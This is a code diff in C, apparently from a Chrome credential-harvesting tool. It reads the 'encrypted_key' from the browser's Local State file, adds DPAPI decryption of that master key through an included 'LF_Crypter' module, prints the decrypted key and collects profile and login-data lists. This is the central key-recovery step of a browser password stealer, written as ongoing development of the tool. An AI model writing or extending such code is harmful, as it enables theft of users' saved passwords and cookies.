@@ -1,3 +1,4 @@
+#include "LF_Crypter.c"
 #include "LF_Utils.c"
 
 #include <stdint.h>
@@ -45,16 +46,21 @@ LF_Chrome__get_localstate_path (char *userdata_path, char *out)
 char *
 LF_Chrome__get_encryption_key (char *localstate_path, int *len)
 {
-  char *encryption_key = NULL;
-
   int buf_len = 4096;
   char buf[buf_len];
   LF_Utils_read_file (localstate_path, buf, buf_len);
 
   const char *key_start = "\"encrypted_key\":\"";
-  const char *key_end ="\"";
+  const char *key_end = "\"";
 
-  LF_Utils_find_str_in_range (buf, key_start, key_end, &encryption_key, len);
+  char *encryption_key
+      = LF_Utils_find_str_in_range (buf, key_start, key_end, len);
+  if (encryption_key == NULL)
+    {
+      fprintf (stderr, "unable to find encryption key\n");
+      exit (-1);
+    }
+
   return encryption_key;
 }
 void
@@ -98,15 +104,14 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
   LF_Chrome__get_localstate_path (userdata_path, localstate_path);
 
   int encryption_key_len;
-  unsigned char *encryption_key
+  char *encryption_key
       = LF_Chrome__get_encryption_key (localstate_path, &encryption_key_len);
+  printf ("encryption key [%d]: %s\n", encryption_key_len, encryption_key);
 
-  printf ("encryption key: ");
-  for (int i = 0; i < encryption_key_len; i++)
-    {
-      fputc (encryption_key[i], stdout);
-    }
-  printf ("\n");
+  int decrypted_key_len;
+  char *decrypted_key = LF_Crypter_decrypt_dpapi (
+      encryption_key, encryption_key_len, &decrypted_key_len);
+  printf ("decrypted key [%d]: %s\n", decrypted_key_len, decrypted_key);
 
   out->profile_path_list = LF_Utils_arraylist_new_default ();
   out->login_data_list = LF_Utils_arraylist_new_default ();
@@ -123,8 +128,8 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
           continue;
         }
     }
-
   free (encryption_key);
+  free (decrypted_key);
 }
 void
 LF_Chrome_free_data (struct LF_Chrome_data_struct *out)
